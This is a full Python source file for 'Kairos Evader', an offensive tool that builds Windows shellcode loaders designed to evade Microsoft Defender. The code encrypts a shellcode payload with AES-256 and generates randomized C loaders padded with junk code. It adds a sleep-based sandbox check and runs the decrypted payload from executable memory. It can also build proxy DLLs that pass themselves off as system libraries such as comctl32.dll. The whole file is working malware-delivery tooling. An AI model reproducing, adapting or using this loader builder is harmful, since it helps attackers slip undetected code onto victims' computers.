#!/usr/bin/env python3
"""
Kairos Evader - Hardened AES-256 Encrypted Shellcode Loader
Author: Tyler Ramsbey
https://kairos-sec.com
Generates randomized loaders as DLL or EXE with Defender evasion.
Usage:
    python3 kairos_evader.py --payload payload.bin --dll comctl32.dll
    python3 kairos_evader.py --payload payload.bin --dll comctl32.dll --proxy
    python3 kairos_evader.py --payload payload.bin --exe updater.exe
    python3 kairos_evader.py --payload payload.bin --exe updater.exe --delay 10
"""
import argparse
import gzip
import json
import os
import random
import string
import subprocess
import sys
import tempfile
import urllib.request
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

try:
    import pefile
    HAS_PEFILE = True
except ImportError:
    HAS_PEFILE = False

VERSION = "3.0"
AUTHOR  = "Tyler Ramsbey"
TOOL    = "Kairos Evader"

WINBINDEX_API = "https://winbindex.m417z.com/data/by_filename_compressed/{}.json.gz"
MS_SYMBOL_URL = "https://msdl.microsoft.com/download/symbols/{}/{}/{}"


# \u2500\u2500\u2500 Winbindex DLL Download \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

def fetch_winbindex_data(dll_name: str) -> dict:
    """Fetch DLL version data from Winbindex API."""
    url = WINBINDEX_API.format(dll_name)
    print(f"  [*] Fetching Winbindex data for {dll_name}...")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "KairosEvader/3.0"})
        with urllib.request.urlopen(req, timeout=30) as resp:
            compressed = resp.read()
            decompressed = gzip.decompress(compressed)
            return json.loads(decompressed)
    except Exception as e:
        print(f"  [!] Failed to fetch Winbindex data: {e}")
        return None


def find_latest_x64(data: dict) -> dict:
    """Find the latest x64 version from Winbindex data."""
    candidates = []
    for file_hash, info in data.items():
        if not isinstance(info, dict):
            continue
        file_info = info.get("fileInfo", {})
        machine_type = file_info.get("machineType", 0)
        if machine_type == 0x8664 or machine_type == 34404:
            timestamp = file_info.get("timestamp", 0)
            virtual_size = file_info.get("virtualSize", 0)
            candidates.append({
                "hash": file_hash,
                "timestamp": timestamp,
                "virtual_size": virtual_size,
                "info": info
            })
    if not candidates:
        return None
    candidates.sort(key=lambda x: x["timestamp"], reverse=True)
    return candidates[0]


def build_download_url(dll_name: str, entry: dict) -> str:
    """Build the Microsoft symbol server download URL."""
    file_info = entry["info"].get("fileInfo", {})
    timestamp = file_info.get("timestamp", 0)
    virtual_size = file_info.get("virtualSize", 0)
    time_hex = format(timestamp, 'X')
    size_hex = format(virtual_size, 'x')
    folder = f"{time_hex}{size_hex}"
    return MS_SYMBOL_URL.format(dll_name, folder, dll_name)


def download_dll(dll_name: str, output_path: str) -> bool:
    """Download a DLL from Microsoft via Winbindex."""
    data = fetch_winbindex_data(dll_name)
    if not data:
        return False
    entry = find_latest_x64(data)
    if not entry:
        print(f"  [!] No x64 version found for {dll_name}")
        return False
    url = build_download_url(dll_name, entry)
    print(f"  [*] Downloading from Microsoft Symbol Server...")
    print(f"  [*] URL: {url}")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "KairosEvader/3.0"})
        with urllib.request.urlopen(req, timeout=60) as resp:
            dll_data = resp.read()
        with open(output_path, "wb") as f:
            f.write(dll_data)
        file_size = os.path.getsize(output_path)
        print(f"  [+] Downloaded {dll_name} ({file_size:,} bytes)")
        return True
    except Exception as e:
        print(f"  [!] Download failed: {e}")
        return False


# \u2500\u2500\u2500 DLL Export Proxying \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

def get_dll_exports(dll_path: str) -> list:
    """Extract named exports from a DLL using pefile."""
    if not HAS_PEFILE:
        print("  [!] pefile not installed. Install with: pip install pefile")
        sys.exit(1)
    pe = pefile.PE(dll_path)
    if not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        print(f"  [!] No exports found in {dll_path}")
        return []
    exports = []
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name:
            exports.append(exp.name.decode())
    return exports


def generate_proxy_c(exports: list, forward_name: str) -> str:
    """Generate C source for proxy \u2014 loads real DLL and resolves function pointers."""
    lines = []
    lines.append(f"__attribute__((used)) FARPROC fpTable[{len(exports)}] = {{0}};")
    lines.append(f"HMODULE hRealDll = NULL;")
    lines.append("")
    lines.append("void loadRealDll() {")
    lines.append(f"    if (hRealDll) return;")
    lines.append(f'    char p[MAX_PATH];')
    lines.append(f'    GetSystemDirectoryA(p, MAX_PATH);')
    lines.append(f'    strcat(p, "\\\\{forward_name}.dll");')
    lines.append(f'    hRealDll = LoadLibraryA(p);')
    lines.append(f'    if (!hRealDll) return;')
    for i, name in enumerate(exports):
        lines.append(f'    fpTable[{i}] = GetProcAddress(hRealDll, "{name}");')
    lines.append("}")
    return "\n".join(lines)


def generate_proxy_asm(exports: list) -> str:
    """Generate assembly trampolines that jump to real functions."""
    lines = []
    lines.append("    .text")
    lines.append("")
    lines.append("    .extern fpTable")
    lines.append("")
    for i, name in enumerate(exports):
        offset = i * 8
        lines.append(f"    .global {name}")
        lines.append(f"    .def {name}; .scl 2; .type 32; .endef")
        lines.append(f"{name}:")
        lines.append(f"    lea fpTable(%rip), %rax")
        lines.append(f"    mov {offset}(%rax), %rax")
        lines.append(f"    jmp *%rax")
        lines.append("")
    return "\n".join(lines)


# \u2500\u2500\u2500 Randomization Helpers \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

def rand_name(length=None):
    """Generate a random C-safe identifier."""
    if length is None:
        length = random.randint(6, 14)
    first = random.choice(string.ascii_letters + "_")
    rest = ''.join(random.choices(string.ascii_letters + string.digits + "_", k=length - 1))
    return first + rest


def rand_int():
    """Generate a random integer for junk operations."""
    return random.randint(1, 50000)


def generate_junk_lines(count=None):
    """Generate random junk code lines that compile but do nothing meaningful."""
    if count is None:
        count = random.randint(2, 6)
    lines = []
    for _ in range(count):
        choice = random.randint(0, 7)
        v = rand_name(8)
        if choice == 0:
            lines.append(f"    int {v} = {rand_int()} + {rand_int()}; (void){v};")
        elif choice == 1:
            lines.append(f"    volatile int {v} = {rand_int()} ^ {rand_int()};")
        elif choice == 2:
            lines.append(f"    char {v}[] = \"{rand_name(random.randint(3, 8))}\"; (void){v};")
        elif choice == 3:
            lines.append(f"    if ({rand_int()} > {rand_int() + 50001}) {{ volatile int {v} = {rand_int()}; }}")
        elif choice == 4:
            lines.append(f"    volatile DWORD {v} = GetTickCount() + {rand_int()};")
        elif choice == 5:
            lines.append(f"    for (int {v} = 0; {v} < {random.randint(1, 3)}; {v}++) {{ volatile int {rand_name(6)} = {rand_int()}; }}")
        elif choice == 6:
            lines.append(f"    volatile unsigned long {v} = (unsigned long)({rand_int()} * {random.randint(1, 100)});")
        elif choice == 7:
            lines.append(f"    DWORD {v} = 0; {v} += {rand_int()}; (void){v};")
    return "\n".join(lines)


def generate_junk_functions(count=None):
    """Generate complete junk functions that never get called meaningfully."""
    if count is None:
        count = random.randint(2, 5)
    functions = []
    for _ in range(count):
        fname = rand_name(10)
        ret_type = random.choice(["int", "DWORD", "void"])
        body = generate_junk_lines(random.randint(2, 5))
        if ret_type == "void":
            ret_stmt = ""
        elif ret_type == "int":
            ret_stmt = f"\n    return {rand_int()};"
        else:
            ret_stmt = f"\n    return (DWORD){rand_int()};"
        func = f"""
{ret_type} {fname}() {{
{body}{ret_stmt}
}}
"""
        functions.append(func)
    return "\n".join(functions)


# \u2500\u2500\u2500 C Source Generation \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

def generate_source(key: bytes, iv: bytes, fmt: str, delay: int, proxy_c: str = "") -> str:
    """Generate a randomized C loader source."""
    fn_decrypt   = rand_name(12)
    var_enc_size = rand_name(10)
    var_alg      = rand_name(10)
    var_key_h    = rand_name(10)
    var_plain    = rand_name(10)
    var_tmp_iv   = rand_name(10)
    var_cb_plain = rand_name(10)
    var_old_prot = rand_name(10)
    var_key_arr  = rand_name(10)
    var_iv_arr   = rand_name(10)
    key_hex = ", ".join(f"0x{b:02x}" for b in key)
    iv_hex  = ", ".join(f"0x{b:02x}" for b in iv)
    if delay > 0:
        delay_ms = delay * 1000
        delay_var = rand_name(8)
        delay_code = f"""
    // Timing check
    DWORD {delay_var} = GetTickCount();
    Sleep({delay_ms});
    if (GetTickCount() - {delay_var} < {delay_ms - 500}) return;
"""
    else:
        delay_code = ""
    junk_funcs = generate_junk_functions()
    source = f"""
#include <windows.h>
#include <bcrypt.h>
#include <string.h>
#pragma comment(lib, "bcrypt.lib")
extern unsigned char _binary_payload_enc_start[];
extern unsigned char _binary_payload_enc_end[];
unsigned char {var_key_arr}[] = {{ {key_hex} }};
unsigned char {var_iv_arr}[]  = {{ {iv_hex} }};
{proxy_c}
{junk_funcs}
void {fn_decrypt}() {{
{delay_code}
{generate_junk_lines()}
    DWORD {var_enc_size} = (DWORD)(_binary_payload_enc_end - _binary_payload_enc_start);
    BCRYPT_ALG_HANDLE {var_alg} = NULL;
    BCRYPT_KEY_HANDLE {var_key_h} = NULL;
    ULONG {var_cb_plain} = 0;
{generate_junk_lines()}
    BCryptOpenAlgorithmProvider(&{var_alg}, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty({var_alg}, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey({var_alg}, &{var_key_h}, NULL, 0, {var_key_arr}, sizeof({var_key_arr}), 0);
    unsigned char* {var_plain} = (unsigned char*)VirtualAlloc(
        NULL, {var_enc_size}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!{var_plain}) {{
        BCryptDestroyKey({var_key_h});
        BCryptCloseAlgorithmProvider({var_alg}, 0);
        return;
    }}
{generate_junk_lines()}
    UCHAR {var_tmp_iv}[16];
    memcpy({var_tmp_iv}, {var_iv_arr}, 16);
    BCryptDecrypt({var_key_h}, _binary_payload_enc_start, {var_enc_size}, NULL,
                  {var_tmp_iv}, sizeof({var_tmp_iv}), {var_plain}, {var_enc_size}, &{var_cb_plain},
                  BCRYPT_BLOCK_PADDING);
    DWORD {var_old_prot};
    VirtualProtect({var_plain}, {var_cb_plain}, PAGE_EXECUTE_READ, &{var_old_prot});
    ((void(*)()){var_plain})();
    BCryptDestroyKey({var_key_h});
    BCryptCloseAlgorithmProvider({var_alg}, 0);
}}
"""
    if fmt == "dll":
        var_thread = rand_name(10)
        # If proxying, call loadRealDll in DllMain before anything else
        load_proxy = "        loadRealDll();" if proxy_c else ""
        source += f"""
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {{
    if (dwReason == DLL_PROCESS_ATTACH) {{
{load_proxy}
        HANDLE {var_thread} = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){fn_decrypt}, NULL, 0, NULL);
        if ({var_thread}) CloseHandle({var_thread});
    }}
    return TRUE;
}}
"""
    else:
        var_thread = rand_name(10)
        source += f"""
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
{generate_junk_lines()}
    HANDLE {var_thread} = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){fn_decrypt}, NULL, 0, NULL);
    if ({var_thread}) {{
        WaitForSingleObject({var_thread}, INFINITE);
        CloseHandle({var_thread});
    }}
    return 0;
}}
"""
    return source


# \u2500\u2500\u2500 Build Logic \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

def check_tools():
    """Verify mingw toolchain is available."""
    tools = {
        "x86_64-w64-mingw32-gcc":     "compiler",
        "x86_64-w64-mingw32-objcopy": "objcopy",
    }
    for tool, label in tools.items():
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            print(f"  [!] {label} not found: {tool}")
            print("      Install with: sudo apt install mingw-w64")
            sys.exit(1)


def encrypt_payload(payload_path: str) -> tuple:
    """Read and AES-256-CBC encrypt the shellcode. Returns (encrypted, key, iv)."""
    with open(payload_path, "rb") as f:
        shellcode = f.read()
    key = os.urandom(32)
    iv  = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(shellcode, AES.block_size))
    print(f"  [*] Shellcode size: {len(shellcode):,} bytes")
    print(f"  [*] Encrypted size: {len(encrypted):,} bytes")
    print(f"  [*] AES-256 Key:    {key.hex()}")
    print(f"  [*] IV:             {iv.hex()}")
    return encrypted, key, iv


def build(payload_path: str, output_path: str, fmt: str, delay: int, proxy: bool):
    """Encrypt payload and compile into the specified format."""
    compiler = "x86_64-w64-mingw32-gcc"
    objcopy  = "x86_64-w64-mingw32-objcopy"

    # \u2500\u2500\u2500 Handle DLL proxying \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
    proxy_c = ""
    proxy_asm = ""
    proxy_dll_name = None
    proxy_enabled = False

    if proxy and fmt == "dll":
        dll_name = os.path.basename(output_path)
        proxy_dll_name = os.path.splitext(dll_name)[0]
        orig_dll_path = os.path.join(os.getcwd(), proxy_dll_name + "_orig.dll")

        if os.path.isfile(orig_dll_path):
            print(f"  [*] Using existing {proxy_dll_name}_orig.dll for proxy exports")
        else:
            print(f"  [*] Downloading real {dll_name} from Microsoft...")
            if not download_dll(dll_name, orig_dll_path):
                print(f"  [!] Could not download {dll_name}")
                print(f"  [!] Manually place the real DLL at: {orig_dll_path}")
                sys.exit(1)

        exports = get_dll_exports(orig_dll_path)
        if not exports:
            print("  [!] No exports found \u2014 proxy will not work")
            sys.exit(1)

        print(f"  [+] Found {len(exports)} named exports to proxy")
        print(f"  [*] Generating proxy C source and ASM trampolines...")
        proxy_c = generate_proxy_c(exports, proxy_dll_name)
        proxy_asm = generate_proxy_asm(exports)
        proxy_enabled = True

    elif proxy and fmt == "exe":
        print("  [!] --proxy is only supported with --dll, ignoring")

    # \u2500\u2500\u2500 Encrypt and build \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
    encrypted, key, iv = encrypt_payload(payload_path)
    source = generate_source(key, iv, fmt, delay, proxy_c)

    with tempfile.TemporaryDirectory() as tmpdir:
        enc_path = os.path.join(tmpdir, "payload.enc")
        obj_path = os.path.join(tmpdir, "payload_enc.o")
        c_path   = os.path.join(tmpdir, "loader.c")
        asm_path = os.path.join(tmpdir, "trampolines.S")

        with open(enc_path, "wb") as f:
            f.write(encrypted)

        print("  [*] Converting encrypted payload to object file...")
        result = subprocess.run([
            objcopy,
            "-I", "binary",
            "-O", "pe-x86-64",
            "-B", "i386:x86-64",
            "--rename-section", ".data=.rdata",
            "payload.enc",
            obj_path
        ], cwd=tmpdir, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"  [!] objcopy failed:\n{result.stderr}")
            sys.exit(1)

        with open(c_path, "w") as f:
            f.write(source)

        output_full = os.path.join(os.getcwd(), output_path)
        print(f"  [*] Compiling {output_path} ({fmt.upper()})...")

        compile_cmd = [compiler, "-O2"]

        if fmt == "dll":
            compile_cmd += ["-shared"]

        compile_cmd += [
            "-mwindows",
            "-o", output_full,
            c_path,
            obj_path,
        ]

        # Add ASM trampolines if proxying
        if proxy_enabled:
            with open(asm_path, "w") as f:
                f.write(proxy_asm)
            compile_cmd.append(asm_path)

        compile_cmd.append("-lbcrypt")

        result = subprocess.run(compile_cmd, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"  [!] Compilation failed:\n{result.stderr}")
            sys.exit(1)

    file_size = os.path.getsize(output_path)
    print()
    print(f"  [+] Success! Built {output_path} ({file_size:,} bytes)")
    print(f"  [+] Format: {fmt.upper()}")
    if delay > 0:
        print(f"  [+] Sandbox delay: {delay}s")
    if proxy_enabled:
        print(f"  [+] Proxy mode: runtime forwarding to System32\\{proxy_dll_name}.dll")
        print(f"  [+] Single DLL deployment \u2014 no _orig.dll needed on target!")
    print(f"  [+] Unique binary \u2014 rebuild anytime for a fresh signature")


def banner():
    print("""
Kairos Evader - AES-256 Encrypted Shellcode Loader
Author: Tyler Ramsbey
https://kairos-sec.com
""")


def main():
    banner()
    parser = argparse.ArgumentParser(
        description=f"{TOOL} v{VERSION} by {AUTHOR} \u2014 Hardened AES-256 Encrypted Shellcode Loader Builder"
    )
    parser.add_argument(
        "--payload", "-p",
        required=True,
        help="Path to raw shellcode file (e.g. payload.bin)"
    )
    parser.add_argument(
        "--delay",
        type=int,
        default=0,
        help="Seconds to sleep before decryption for sandbox evasion (default: 0)"
    )
    parser.add_argument(
        "--proxy",
        action="store_true",
        default=False,
        help="Enable DLL proxying \u2014 auto-downloads real DLL and generates runtime forwarding stubs (DLL mode only)"
    )

    output = parser.add_mutually_exclusive_group(required=True)
    output.add_argument(
        "--dll", "-d",
        metavar="FILENAME",
        help="Build as DLL (e.g. comctl32.dll)"
    )
    output.add_argument(
        "--exe", "-e",
        metavar="FILENAME",
        help="Build as EXE (e.g. updater.exe)"
    )
    args = parser.parse_args()

    if not os.path.isfile(args.payload):
        print(f"  [!] Payload not found: {args.payload}")
        sys.exit(1)

    if args.proxy and not HAS_PEFILE:
        print("  [!] --proxy requires pefile. Install with: pip install pefile")
        sys.exit(1)

    check_tools()

    if args.dll:
        build(args.payload, args.dll, "dll", args.delay, args.proxy)
    else:
        build(args.payload, args.exe, "exe", args.delay, args.proxy)

    print()


if __name__ == "__main__":
    main()
